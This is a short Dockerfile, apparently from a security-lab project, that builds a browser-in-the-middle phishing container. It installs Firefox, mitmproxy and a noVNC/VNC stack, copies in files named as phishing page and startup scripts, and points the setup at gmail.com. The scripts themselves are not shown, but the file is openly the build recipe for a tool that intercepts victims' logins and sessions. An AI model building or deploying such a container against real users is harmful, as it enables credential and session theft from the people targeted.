FROM debian:bullseye-slim
LABEL maintainer="admin@csalab.id"
WORKDIR /root
RUN apt-get update && \
apt-get -y upgrade && \
DEBIAN_FRONTEND=noninteractive apt-get -yq install \
  openbox \
  firefox-esr \
  mitmproxy \
  curl \
  novnc \
  net-tools \
  tigervnc-standalone-server \
  tigervnc-xorg-extension \
  tigervnc-viewer && \
apt-get -y full-upgrade && \
apt-get -y autoremove && \
apt-get clean all && \
rm -rf /var/lib/apt/lists/*
COPY script/phising.index.html /usr/share/novnc/index.html
COPY script/phising.startup.sh /startup.sh
ENV WEBSITE="https://gmail.com/"
ENTRYPOINT [ "/bin/bash", "/startup.sh" ]